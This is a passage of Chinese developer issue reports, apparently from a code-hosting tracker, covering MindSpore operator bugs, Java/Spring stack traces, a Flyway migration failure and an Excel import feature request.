class=""btn btn-danger btn-xs"" href=""#"" onclick=""$.operate.remove(\'' + row.bid_id + '\')""&gt;&lt;i class=""fa fa-remove""&gt;&lt;/i&gt;删除&lt;/a&gt;'); actions.push('&lt;a class=""btn btn-success btn-xs"" href=""#"" onclick=""$.operate.edit(\'' + row.bid_id + '\',800,450)""&gt;&lt;i class=""fa fa-edit""&gt;&lt;/i&gt;编辑&lt;/a&gt; '); return $.table.dropdownToggle(actions.join('')); } }] }; $.table.init(options); }); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt;"
请问客户端支持 连接域名的服务器吗？,"appsettings.json： // 服务端公网ip, 对应服务端配置文件的 BindAddr 请问客户端支持 连接域名的服务器吗？如 ServerAddr 指向DNS A记录。   <code>: ""ServerAddr"": ""test.abc.com"","
GroupNormd的输入只支持四维的,"GroupNorm不支持五维的输入（N, C, D, H, W）。 / 硬件环境: /device GPU : -- MindSpore version :1.7.0 -- Python version :3.7.5 -- OS platform and distribution :Ubuntu 16.04 -- GCC/Compiler version : (/): /mode pynative 运行用例 正常输出   <code>: from mindspore import nn, Tensor import numpy as np group_norm = nn.GroupNorm(2, 4) x = Tensor(np.ones([1,4,2,2,3], np.float32)) out = group_norm(x)"
查询db.table()报错,"报错日志：   <code>: 2021-04-09 17:30:46.977 ERROR 1238 --- [nio-9999-exec-7] o.a.c.c.C.[.[.[/].[dispatcherServlet] : Servlet.service() for servlet [dispatcherServlet] in context with path [] threw exception [Request processing failed; nested exception is org.springframework.http.converter.HttpMessageConversionException: Type definition error: [simple type, class org.ssssssss.magicapi.modules.table.NamedTable]; nested exception is com.fasterxml.jackson.databind.exc.InvalidDefinitionException: No serializer found for class org.ssssssss.magicapi.modules.table.NamedTable and no properties discovered to create BeanSerializer (to avoid exception, disable SerializationFeature.FAIL_ON_EMPTY_BEANS) (through reference chain: org.ssssssss.magicapi.model.JsonBean[""data""]-&gt;org.ssssssss.magicapi.model.JsonBean[""data""])] with root cause com.fasterxml.jackson.databind.exc.InvalidDefinitionException: No serializer found for class org.ssssssss.magicapi.modules.table.NamedTable and no properties discovered to create BeanSerializer (to avoid exception, disable SerializationFeature.FAIL_ON_EMPTY_BEANS) (through reference chain: org.ssssssss.magicapi.model.JsonBean[""data""]-&gt;org.ssssssss.magicapi.model.JsonBean[""data""]) at com.fasterxml.jackson.databind.exc.InvalidDefinitionException.from(InvalidDefinitionException.java:77) ~[jackson-databind-2.11.4.jar:2.11.4] at com.fasterxml.jackson.databind.SerializerProvider.reportBadDefinition(SerializerProvider.java:1277) ~[jackson-databind-2.11.4.jar:2.11.4] at com.fasterxml.jackson.databind.DatabindContext.reportBadDefinition(DatabindContext.java:400) ~[jackson-databind-2.11.4.jar:2.11.4] at com.fasterxml.jackson.databind.ser.impl.UnknownSerializer.failForEmpty(UnknownSerializer.java:71) ~[jackson-databind-2.11.4.jar:2.11.4] at com.fasterxml.jackson.databind.ser.impl.UnknownSerializer.serialize(UnknownSerializer.java:33) ~[jackson-databind-2.11.4.jar:2.11.4] at com.fasterxml.jackson.databind.ser.BeanPropertyWriter.serializeAsField(BeanPropertyWriter.java:728) ~[jackson-databind-2.11.4.jar:2.11.4] at com.fasterxml.jackson.databind.ser.std.BeanSerializerBase.serializeFields(BeanSerializerBase.java:755) ~[jackson-databind-2.11.4.jar:2.11.4] at com.fasterxml.jackson.databind.ser.BeanSerializer.serialize(BeanSerializer.java:178) ~[jackson-databind-2.11.4.jar:2.11.4] at com.fasterxml.jackson.databind.ser.BeanPropertyWriter.serializeAsField(BeanPropertyWriter.java:728) ~[jackson-databind-2.11.4.jar:2.11.4] at com.fasterxml.jackson.databind.ser.std.BeanSerializerBase.serializeFields(BeanSerializerBase.java:755) ~[jackson-databind-2.11.4.jar:2.11.4] at com.fasterxml.jackson.databind.ser.BeanSerializer.serialize(BeanSerializer.java:178) ~[jackson-databind-2.11.4.jar:2.11.4] at com.fasterxml.jackson.databind.ser.DefaultSerializerProvider._serialize(DefaultSerializerProvider.java:480) ~[jackson-databind-2.11.4.jar:2.11.4] at com.fasterxml.jackson.databind.ser.DefaultSerializerProvider.serializeValue(DefaultSerializerProvider.java:319) ~[jackson-databind-2.11.4.jar:2.11.4] at com.fasterxml.jackson.databind.ObjectWriter$Prefetch.serialize(ObjectWriter.java:1516) ~[jackson-databind-2.11.4.jar:2.11.4] at com.fasterxml.jackson.databind.ObjectWriter.writeValue(ObjectWriter.java:1006) ~[jackson-databind-2.11.4.jar:2.11.4] at org.springframework.http.converter.json.AbstractJackson2HttpMessageConverter.writeInternal(AbstractJackson2HttpMessageConverter.java:454) ~[spring-web-5.3.5.jar:5.3.5] at org.springframework.http.converter.AbstractGenericHttpMessageConverter.write(AbstractGenericHttpMessageConverter.java:104) ~[spring-web-5.3.5.jar:5.3.5] at org.springframework.web.servlet.mvc.method.annotation.AbstractMessageConverterMethodProcessor.writeWithMessageConverters(AbstractMessageConverterMethodProcessor.java:290) ~[spring-webmvc-5.3.5.jar:5.3.5] at org.springframework.web.servlet.mvc.method.annotation.RequestResponseBodyMethodProcessor.handleReturnValue(RequestResponseBodyMethodProcessor.java:181) ~[spring-webmvc-5.3.5.jar:5.3.5] at org.springframework.web.method.support.HandlerMethodReturnValueHandlerComposite.handleReturnValue(HandlerMethodReturnValueHandlerComposite.java:78) ~[spring-web-5.3.5.jar:5.3.5] at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:124) ~[spring-webmvc-5.3.5.jar:5.3.5] at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:894) ~[spring-webmvc-5.3.5.jar:5.3.5] at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:808) ~[spring-webmvc-5.3.5.jar:5.3.5] at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) ~[spring-webmvc-5.3.5.jar:5.3.5] at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1060) ~[spring-webmvc-5.3.5.jar:5.3.5] at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:962) ~[spring-webmvc-5.3.5.jar:5.3.5] at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006) ~[spring-webmvc-5.3.5.jar:5.3.5] at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:898) ~[spring-webmvc-5.3.5.jar:5.3.5] at javax.servlet.http.HttpServlet.service(HttpServlet.java:626) ~[tomcat-embed-core-9.0.44.jar:4.0.FR] at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883) ~[spring-webmvc-5.3.5.jar:5.3.5] at javax.servlet.http.HttpServlet.service(HttpServlet.java:733) ~[tomcat-embed-core-9.0.44.jar:4.0.FR] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:227) ~[tomcat-embed-core-9.0.44.jar:9.0.44] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.44.jar:9.0.44] at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53) ~[tomcat-embed-websocket-9.0.44.jar:9.0.44] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) ~[tomcat-embed-core-9.0.44.jar:9.0.44] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.44.jar:9.0.44] at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) ~[spring-web-5.3.5.jar:5.3.5] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.3.5.jar:5.3.5] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) ~[tomcat-embed-core-9.0.44.jar:9.0.44] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.44.jar:9.0.44] at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) ~[spring-web-5.3.5.jar:5.3.5] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.3.5.jar:5.3.5] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) ~[tomcat-embed-core-9.0.44.jar:9.0.44] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.44.jar:9.0.44] at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) ~[spring-web-5.3.5.jar:5.3.5] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.3.5.jar:5.3.5] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) ~[tomcat-embed-core-9.0.44.jar:9.0.44] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.44.jar:9.0.44] at org.ssssssss.magicapi.config.MagicCorsFilter.doFilter(MagicCorsFilter.java:42) ~[magic-api-1.0.1.jar:1.0.1] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) ~[tomcat-embed-core-9.0.44.jar:9.0.44] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.44.jar:9.0.44] at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:202) ~[tomcat-embed-core-9.0.44.jar:9.0.44] at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:97) [tomcat-embed-core-9.0.44.jar:9.0.44] at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:542) [tomcat-embed-core-9.0.44.jar:9.0.44] at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:143) [tomcat-embed-core-9.0.44.jar:9.0.44] at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92) [tomcat-embed-core-9.0.44.jar:9.0.44] at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:78) [tomcat-embed-core-9.0.44.jar:9.0.44] at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:357) [tomcat-embed-core-9.0.44.jar:9.0.44] at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:374) [tomcat-embed-core-9.0.44.jar:9.0.44] at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) [tomcat-embed-core-9.0.44.jar:9.0.44] at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:893) [tomcat-embed-core-9.0.44.jar:9.0.44] at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1707) [tomcat-embed-core-9.0.44.jar:9.0.44] at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) [tomcat-embed-core-9.0.44.jar:9.0.44] at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142) [na:1.8.0_121] at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617) [na:1.8.0_121] at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) [tomcat-embed-core-9.0.44.jar:9.0.44] at java.lang.Thread.run(Thread.java:745) [na:1.8.0_121]"
[CT][MS][用户接口-HingeEmbeddingLoss]operator has TypeError when input dtype is float16 on Graph mode,"当输入均为float16的时候，算子反向会计算出错 / 硬件环境: /device ascend/GPU/CPU/kirin/等其他芯片 : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode graph test_nn_hingeembeddingloss_5d_float16_graph def test_nn_hingeembeddingloss_5d_float16_graph(): logits = Tensor(np.random.randn(293, 271, 3, 2, 2).astype(np.float16)) labels = Tensor((np.random.randint(2, size=(293, 271, 3, 2, 2)) * 2 - 1).astype(np.float16)) input_list = [logits, labels] fact = HingeEmbeddingLossMock(inputs=input_list) fact.forward_cmp() # with pytest.raises(TypeError): test_hingeembeddingloss.py:254: ../share/ops/nn/hingeembeddingloss_ops.py:76: in grad_cmp out_mindspore = self.grad_mindspore_impl() ../share/ops/nn/hingeembeddingloss_ops.py:66: in grad_mindspore_impl return net(*self.inputs, grad) /root/archiconda3/envs/sjx_high/lib/python3.7/site-packages/mindspore/nn/cell.py:627: in call out = self.compile_and_run(*args) /root/archiconda3/envs/sjx_high/lib/python3.7/site-packages/mindspore/nn/cell.py:940: in compile_and_run self.compile(*inputs) /root/archiconda3/envs/sjx_high/lib/python3.7/site-packages/mindspore/nn/cell.py:919: in compile jit_config_dict=self._jit_config_dict) self = &lt;mindspore.common.api._CellGraphExecutor object at 0xffff5c9956d0&gt;, obj = GradOfFirstInput&lt; (network): WrapOp&lt; (hingeembeddingloss): HingeEmbeddingLoss&lt;&gt; &gt; phase = 'train.1671178639440586752.281469024296688.1', do_convert = True, jit_config_dict = {} args = (Tensor(shape=[293, 271, 3, 2, 2], dtype=Float16, value= [[[[[-8.8330e-01, 8.4961e-01], [-1.1072e-01, -1.2031e+00..., [[-1.0000e+00, 1.0000e+00], [-1.0000e+00, -1.0000e+00]]]]]), Tensor(shape=[], dtype=Float16, value= 1.06836)) E TypeError: Type Join Failed: dtype1 = Float16, dtype2 = Float32. E For more details, please refer to https://www.mindspore.cn/search?inputValue=Type%20Join%20Failed E E ---------------------------------------------------- E - The Traceback of Net Construct Code: E ---------------------------------------------------- E The function call stack (See file '/home/sjx/MindSporeTest/operations/rank_0/om/analyze_fail.dat' for more details. Get instructions about at https://www.mindspore.cn/search?inputValue=analyze_fail.dat): E # 0 In file /home/sjx/MindSporeTest/share/grad.py:18 E if self.wrt_params: E # 1 In file /home/sjx/MindSporeTest/share/grad.py:26 E if self.real_inputs_count is None or self.sens_param is False: E # 2 In file /home/sjx/MindSporeTest/share/grad.py:27 E return self.grad(self.network)(*inputs) E ^ E E ---------------------------------------------------- E - Framework Error Message: (For framework developers) E ---------------------------------------------------- E This: AbstractScalar(Type: Float16, Value: AnyValue, Shape: NoShape), other: AbstractScalar(Type: Float32, Value: AnyValue, Shape: NoShape). Please check the node: @construct.WrapOp.15:16{[0]: 16, [1]: construct.WrapOp} E E ---------------------------------------------------- E - The Function Call Stack: (For framework developers) E ---------------------------------------------------- E In file /home/sjx/MindSporeTest/share/grad.py:27/ return self.grad(self.network)(*inputs)/ E E ---------------------------------------------------- E - C++ Call Stack: (For framework developers) E ---------------------------------------------------- E mindspore/core/abstract/abstract_value.cc:67 TypeJoinLogging /root/archiconda3/envs/sjx_high/lib/python3.7/site-packages/mindspore/common/api.py:1351: TypeError 2. 3. pass   <code>: fact.grad_cmp() def compile(self, obj, *args, phase='predict', do_convert=True, jit_config_dict=None): """""" Compiles graph. Args: obj (Function/Cell): The function or cell instance need compile. args (tuple): Function or cell input arguments. phase (str): The name of compile phase. Default: 'predict'. do_convert (bool): When set to True, convert ME graph to GE graph after compiling graph. jit_config_dict (dict): Jit config for compile. Default: None. Return: Str, the full phase of the cell. Bool, if the graph has been compiled before, return False, else return True. """""" obj.__parse_method__ = 'construct' if not hasattr(obj, obj.__parse_method__): raise AttributeError( 'The class {} dose not have method {}'.format(obj.__class__.__name__, obj.__parse_method__)) args_list = args self.enable_tuple_broaden = False if hasattr(obj, ""enable_tuple_broaden""): self.enable_tuple_broaden = obj.enable_tuple_broaden self._graph_executor.set_enable_tuple_broaden(self.enable_tuple_broaden) key = self._graph_executor.generate_arguments_key(obj, args_list, self.enable_tuple_broaden) obj.arguments_key = str(key) phase = phase + '.' + str(obj.create_time) + '.' + str(id(obj)) + '.' + obj.arguments_key if phase in obj.compile_cache and self.has_compiled(phase): logger.debug(""%r graph has existed."", phase) return phase, False obj.check_names() _check_full_batch() self._set_dataset_mode(args_list) self._set_compile_cache_dep_files(phase) enable_ge = context.get_context(""enable_ge"") self._graph_executor.set_weights_values(obj.parameters_dict()) if jit_config_dict: self._graph_executor.set_jit_config(jit_config_dict) result = self._graph_executor.compile(obj, args_list, phase, self._use_vm_mode()) analyze_fail.dat"
Detected failed migration to version 3.2 (update),"运行提示 Detected failed migration to version 3.2 (update) 2022-06-05 15:58:47 [restartedMain] INFO c.m.mblog.BootApplication:55 Starting BootApplication on LAPTOP-LUOJW with PID 37332 (E:\IdeaProjects\mblog\target\classes started by LUOJW in E:\IdeaProjects\mblog) 2022-06-05 15:58:47 [restartedMain] INFO c.m.mblog.BootApplication:655 The following profiles are active: docker 2022-06-05 15:58:47 [background-preinit] WARN o.s.h.c.j.Jackson2ObjectMapperBuilder:127 For Jackson Kotlin classes support please add ""com.fasterxml.jackson.module:jackson-module-kotlin"" to the classpath 2022-06-05 15:58:49 [restartedMain] INFO o.a.s.c.e.EhCacheManager:158 Cache with name 'com.mtons.mblog.shiro.AccountRealm.authorizationCache' does not yet exist. Creating now. 2022-06-05 15:58:49 [restartedMain] INFO o.a.s.c.e.EhCacheManager:165 Added EhCache named [com.mtons.mblog.shiro.AccountRealm.authorizationCache] 2022-06-05 15:58:49 [restartedMain] WARN i.undertow.websockets.jsr:68 UT026010: Buffer pool was not set on WebSocketDeploymentInfo, the default pool will be used 2022-06-05 15:58:49 [restartedMain] INFO io.undertow.servlet:364 Initializing Spring embedded WebApplicationContext 2022-06-05 15:58:49 [restartedMain] INFO c.z.h.HikariDataSource:110 HikariPool-1 - Starting... 2022-06-05 15:58:50 [restartedMain] INFO c.z.h.HikariDataSource:123 HikariPool-1 - Start completed. 2022-06-05 15:58:50 [restartedMain] INFO o.f.c.i.l.VersionPrinter:49 Flyway Community Edition 6.4.0 by Redgate 2022-06-05 15:58:51 [restartedMain] INFO o.f.c.i.d.DatabaseFactory:49 Database: jdbc:mysql://mysql.gsjxy.com.cn:13306/db_mblog (MySQL 8.0) 2022-06-05 15:58:53 [restartedMain] WARN o.s.b.w.s.c.AnnotationConfigServletWebServerApplicationContext:558 Exception encountered during context initialization - cancelling refresh attempt: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'flywayInitializer' defined in class path resource [org/springframework/boot/autoconfigure/flyway/FlywayAutoConfiguration$FlywayConfiguration.class]: Invocation of init method failed; nested exception is org.flywaydb.core.api.FlywayException: Validate failed: Detected failed migration to version 3.2 (update) 2022-06-05 15:58:53 [restartedMain] INFO c.z.h.HikariDataSource:350 HikariPool-1 - Shutdown initiated... 2022-06-05 15:58:53 [restartedMain] INFO c.z.h.HikariDataSource:352 HikariPool-1 - Shutdown completed. 2022-06-05 15:58:53 [restartedMain] ERROR o.s.b.SpringApplication:826 Application run failed org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'flywayInitializer' defined in class path resource [org/springframework/boot/autoconfigure/flyway/FlywayAutoConfiguration$FlywayConfiguration.class]: Invocation of init method failed; nested exception is org.flywaydb.core.api.FlywayException: Validate failed: Detected failed migration to version 3.2 (update) Caused by: org.flywaydb.core.api.FlywayException: Validate failed: Detected failed migration to version 3.2 (update) 有人给我解答一下吗   <code>: at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1796) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:595) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:517) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:323) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:321) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:202) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:310) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:202) at org.springframework.context.support.AbstractApplicationContext.getBean(AbstractApplicationContext.java:1108) at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:868) at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:550) at org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.refresh(ServletWebServerApplicationContext.java:141) at org.springframework.boot.SpringApplication.refresh(SpringApplication.java:747) at org.springframework.boot.SpringApplication.refreshContext(SpringApplication.java:397) at org.springframework.boot.SpringApplication.run(SpringApplication.java:315) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1226) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1215) at com.mtons.mblog.BootApplication.main(BootApplication.java:18) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.boot.devtools.restart.RestartLauncher.run(RestartLauncher.java:49) at org.flywaydb.core.Flyway.doValidate(Flyway.java:285) at org.flywaydb.core.Flyway.access$100(Flyway.java:74) at org.flywaydb.core.Flyway$1.execute(Flyway.java:167) at org.flywaydb.core.Flyway$1.execute(Flyway.java:159) at org.flywaydb.core.Flyway.execute(Flyway.java:530) at org.flywaydb.core.Flyway.migrate(Flyway.java:159) at org.springframework.boot.autoconfigure.flyway.FlywayMigrationInitializer.afterPropertiesSet(FlywayMigrationInitializer.java:65) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeInitMethods(AbstractAutowireCapableBeanFactory.java:1855) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1792) ... 23 common frames omitted"
ImportParams希望增加是否过滤掉Excel行所有列文本为空,"ExcelImportUtil.importExcelMore解析Excel的一个关于空文本列的行，是否有必要读取，或者能不能进行过滤，因为这个结果集会导致view错误感知。 新建一个Excel文件，填入3行测试数据，把某两行数据使用Del键清空列的内容，实际这个行还存在 使用ExcelImportUtil.importExcelMore解析 业务类使用Excel注解判断必填空值 4.这里肯定会被列入错误数据failList集合中 还是希望能提前过滤掉一个row的列文本全是空文本，不应该被解析处理   <code>: @Getter @Setter @EqualsAndHashCode(callSuper = false) public class PolicyInsuredBO implements Serializable { private static final long serialVersionUID = 1L; /** * 序号 */ @Excel(name = ""序号"") @NotNull(message = ""序号不能为空"") private Long id; /** * 保单号 */ @Excel(name = ""保单号"") @NotBlank(message = ""保单号不能为空"") private String policyNumber; /** * 保险公司 */ private Integer productCompanyId; /** * 企业id */ private Long policyInsuredEnterpriseId; /** * 产品id */ private Integer productId; /** * 产品code */ private String productCode; /** * 产品名称 */ private String productName; /** * 计划id */ private Integer planId; /** * 计划名称 */ private String planName; /** * 个人保单号 */ @Excel(name = ""个人保单号"") private String insuredPolicyNo; /** * 被保险人姓名 */ @Excel(name = ""姓名"") @NotBlank(message = ""姓名不能为空"") private String legalName; /** * 证件类型 syslookup 29身份证 30港澳通行证 31护照 32驾驶证 33居住证 */ @Excel(name = ""证件类型"") @Pattern(regexp = ""(身份证)|(港澳通行证)|(护照)|(驾驶证)|(居住证)"", message = ""证件类型只能填写：身份证、港澳通行证、护照、驾驶证、居住证其中之一"") private String credentialsTypeId; /** * 被保人证件号 */ @Excel(name = ""证件号"") @NotBlank(message = ""证件号不能为空"") private String legalIdOfInsureds; /** * 手机号 */ @Excel(name = ""手机号"") private String mobile; /** * 出生日期 */ @Excel(name = ""出生日期"") private String birthDate; /** * 年龄 */ @Excel(name = ""年龄"") private Integer age; /** * 性别 man female */ @Excel(name = ""性别"") private String genderCd; /** * 客户类型 1 本人 2家属 */ @Excel(name = ""被保人类型"") @Pattern(regexp = ""(本人)|(连带)"", message = ""客户类型只能填写：本人、连带其中之一"") private String clientType; /** * 家属类型 1配偶 2子女 3父母 */ @Excel(name = ""连带关系"") private String familyDependantType; /** * 计划代码 */ @Excel(name = ""计划代码"") @NotBlank(message = ""计划代码不能为空"") private String planCode; /** * 客户编号 */ @Excel(name = ""客户编号"") private String clientCode; /** * 开始日期 */ @Excel(name = ""开始日期"") @NotBlank(message = ""开始日期不能为空"") private String effective; /** * 终保日期 */ @Excel(name = ""终保日期"") @NotBlank(message = ""终保日期不能为空"") private String expiration; /** * 主账号id */ private Long mainClinetLegalId; /** * 主账户姓名 */ @Excel(name = ""主账户姓名"") private String mainPolicyName; /** * 主账户证件号 */ @Excel(name = ""主账户证件号"") private String mainPolicyCertNo; /** * 开户行 */ @Excel(name = ""开户行"") private String bankName; /** * 开户行支行名称 */ @Excel(name = ""开户分行"") private String bankBranchName; /** * 开户名 */ @Excel(name = ""开户名"") private String bankAccountName; /** * 银行卡号 */ @Excel(name = ""银行卡号"") private String bankCardNo; /** * 领款方式 */ @Excel(name = ""领款方式"") private String paymentWay; /** * 社保类型 1 无 2 有3 城镇职工 4 城镇居民 5 城乡居民6 新农合 7公务员 8其他 */ @Excel(name = ""社保类型"") private String isMedicalInsurance; /** * 社保地址 */ @Excel(name = ""社保所在地"") private String medicalInsuranceAddress; /** * 部门 */ @Excel(name = ""部门"") private String department; @Excel(name = ""邮箱"") private String email; @Excel(name = ""工作地址"") private String workAddress; @Excel(name = ""家庭地址"") private String familyAddress; }"
[MDT][BUG][Posterize]数据输入Tensor的bit类型不为uint8时，报错信息不准确或未报错,"数据输入Tensor的bit类型不为uint8时，报错信息不准确 / 硬件环境: /device ascend/GPU/CPU/kirin/等其他芯片 : -- MindSpore version :1.8.0 -- Python version :3.7.5 -- OS platform and distribution :Linux huawei 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux -- GCC/Compiler version : gcc (GCC) 7.3.0 (/): /mode pynative /mode graph test_func_posterize_028 test_func_posterize_029 test_func_posterize_030 test_func_posterize_031 28.用例执行报错，""Unexpected error. Posterize: data type of input image should be uint8, but got float32"" 29.用例执行报错，""Unexpected error. Posterize: data type of input image should be uint8, but got int32"" 30.用例执行报错，""Unexpected error. Posterize: data type of input image should be uint8, but got int8"" 31.用例执行报错，""Unexpected error. Posterize: data type of input image should be uint8, but got uint16"" 28.报错信息不准确， 29.报错信息不准确， 30.用例执行未报错（对标算子pytorch会报错） 31.报错信息不准确，   <code>: 28. image = np.random.randn(36, 89, 3).astype(np.float32) 29. image = np.random.randn(36, 89, 3).astype(np.int32) 30. image = np.random.randn(36, 89, 3).astype(np.int8) 31. image = np.random.randn(36, 89, 3).astype(np.uint16) posterize_op = v_trans.Posterize(1) out = posterize_op(image) RuntimeError: Unexpected error. Posterize: data type of input image should be int, but got unknown RuntimeError: Unexpected error. Posterize: data type of input image should be int, but got unknown RuntimeError: Unexpected error. Posterize: data type of input image should be int, but got unknown"
"[CT][MS][control_flow]while in while with return, grad stuck",": /device gpu /device cpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : python while_in_while_cr.py Ascend GPU   <code>: from mindspore.common import Tensor, Parameter, dtype from mindspore.nn import Cell import mindspore.ops.operations as P from mindspore.ops.composite import GradOperation from mindspore import context import numpy as np #context.set_context(mode=context.PYNATIVE_MODE) class Grad(Cell): def __init__(self, net): super().__init__() self.grad = GradOperation(get_all=True) self.net = net def construct(self, x, y): grad_net = self.grad(self.net) gradx, grady = grad_net(x, y) return gradx, grady class CtrlWhileInWhileCR(Cell): def __init__(self, t): super().__init__() self.add = P.Add() self.mul = P.Mul() self.para = Parameter(Tensor(t, dtype.float32), name=""a"") def construct(self, x, y): out = self.mul(y, y) while x != 3: while self.para &gt; 5: self.para -= 1 x += 1 if x &gt; 3: self.para -= x return out out = self.add(out, y) continue out = self.mul(out, y) return out input_np = np.ones([3, 2]).astype(np.float32) x = Tensor(2, dtype.float32) t = 8 y = Tensor(input_np) net = CtrlWhileInWhileCR(t) #out = net(x, y) #print(out) grad_net = Grad(net) grad = grad_net(x, y) print(grad) [INFO] RUNTIME(116180,python):2021-09-10-17:30:05.635.494 [api_impl.cc:457] 116333 StreamSynchronize: stream_id=38 [INFO] RUNTIME(116180,python):2021-09-10-17:30:05.635.559 [pool.cc:456] 116333 GetItemBySerial: stream_id=38, task_id=3661, serial_id=3661 [INFO] RUNTIME(116180,python):2021-09-10-17:30:05.635.617 [stream.cc:887] 116333 TryDelRecordedTask: del public task from stream, stream_id=38, tailTaskId=3661, delTaskId=3661, head=3662, tail=3662 [INFO] RUNTIME(116180,python):2021-09-10-17:30:05.635.674 [pool.cc:456] 116333 GetItemBySerial: stream_id=38, task_id=3661, serial_id=3661 [INFO] RUNTIME(116180,python):2021-09-10-17:30:05.635.730 [logger.cc:1548] 116333 TaskFinished: device_id=0, stream_id=38, task_id=3661, task_type=13,task_finish_num=9882 .... Not Terminated [INFO] SESSION(23986,7fe4477fe700,python):2021-09-10-20:54:55.311.973 [mindspore/ccsrc/backend/session/executor.cc:127] Run] Start run graph 11 [INFO] SESSION(23986,7fe4477fe700,python):2021-09-10-20:54:55.311.982 [mindspore/ccsrc/backend/session/session_basic.h:249] LoadInputs] Load inputs [INFO] SESSION(23986,7fe4477fe700,python):2021-09-10-20:54:55.312.023 [mindspore/ccsrc/backend/session/session_basic.cc:2228] RunGraphImpl] Run graph start, graph id: 11 [INFO] 